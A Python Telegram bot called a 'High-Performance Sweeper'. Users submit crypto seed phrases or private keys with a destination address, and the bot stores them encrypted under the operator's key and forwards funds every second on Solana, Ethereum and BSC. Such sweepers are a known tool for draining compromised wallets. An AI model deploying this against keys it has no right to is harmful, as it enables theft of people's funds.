from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import asyncio
import logging
import json
import os
from cryptography.fernet import Fernet

from chains import solana, ethereum, bsc
from config import TELEGRAM_BOT_TOKEN

# ---------------- CONFIG ----------------

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

DATA_FILE = "wallets.json"
SECRET_KEY = os.getenv("SECRET_KEY")

if not SECRET_KEY:
    raise Exception("Set SECRET_KEY env")

cipher = Fernet(SECRET_KEY.encode())

# ---------------- STORAGE ----------------

data_store = {}

def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def load_data():
    global data_store
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            data_store = json.load(f)
            data_store = {int(k): v for k, v in data_store.items()}
        logger.info("✅ Data loaded")

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(data_store, f)

# ---------------- FLASK ----------------

@app.route("/")
def home():
    return "Bot alive"

# ---------------- COMMANDS ----------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ High-Performance Sweeper\n\n"
        "/setwallet <chain> <secret> <destination>\n"
        "/getinfo\n"
        "/removewallet"
    )

async def setwallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /setwallet <chain> <secret> <destination>")
        return

    chain = context.args[0].lower()
    destination = context.args[-1]
    secret_input = " ".join(context.args[1:-1])

    if chain not in ["solana", "ethereum", "bsc"]:
        await update.message.reply_text("Invalid chain")
        return

    wallet_type = "seed" if " " in secret_input else "private_key"

    user_id = update.effective_user.id

    wallet = {
        "chain": chain,
        "type": wallet_type,
        "secret": encrypt(secret_input),
        "destination": destination
    }

    data_store.setdefault(user_id, []).append(wallet)
    save_data()

    await update.message.reply_text(f"✅ Added {chain.upper()} ({wallet_type})")

async def getinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in data_store:
        await update.message.reply_text("No wallets")
        return

    msg = "📂 Wallets:\n\n"
    for i, w in enumerate(data_store[user_id]):
        msg += f"{i+1}. {w['chain']} → {w['destination']}\n"

    await update.message.reply_text(msg)

async def removewallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in data_store or not data_store[user_id]:
        await update.message.reply_text("No wallets")
        return

    data_store[user_id].pop()
    save_data()

    await update.message.reply_text("🗑 Removed")

# ---------------- HIGH PERFORMANCE SWEEPER ----------------

# max parallel tasks (IMPORTANT)
MAX_CONCURRENT = 10

async def process_wallet(user_id, wallet, semaphore):
    async with semaphore:
        try:
            secret = decrypt(wallet["secret"])

            # run blocking code in thread (VERY IMPORTANT)
            if wallet["chain"] == "solana":
                await asyncio.to_thread(solana.forward, secret, wallet["destination"], user_id)

            elif wallet["chain"] == "ethereum":
                await asyncio.to_thread(ethereum.forward, secret, wallet["destination"], user_id)

            elif wallet["chain"] == "bsc":
                await asyncio.to_thread(bsc.forward, secret, wallet["destination"], user_id)

        except Exception as e:
            logger.error(f"{user_id} error: {e}")

async def sweeper_loop():
    logger.info("🚀 Async sweeper started")

    semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    while True:
        tasks = []

        for user_id, wallets in data_store.items():
            for wallet in wallets:
                tasks.append(process_wallet(user_id, wallet, semaphore))

        if tasks:
            await asyncio.gather(*tasks)

        await asyncio.sleep(1)  # fast but safe

# ---------------- BOT ----------------

async def main():
    load_data()

    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("setwallet", setwallet))
    application.add_handler(CommandHandler("getinfo", getinfo))
    application.add_handler(CommandHandler("removewallet", removewallet))

    # start sweeper
    asyncio.create_task(sweeper_loop())

    logger.info("🤖 Bot running")
    await application.run_polling()

# ---------------- RUN ----------------

if __name__ == "__main__":
    import threading

    # run bot async loop in thread
    threading.Thread(target=lambda: asyncio.run(main()), daemon=True).start()

    # flask stays simple
    app.run(host="0.0.0.0", port=5000)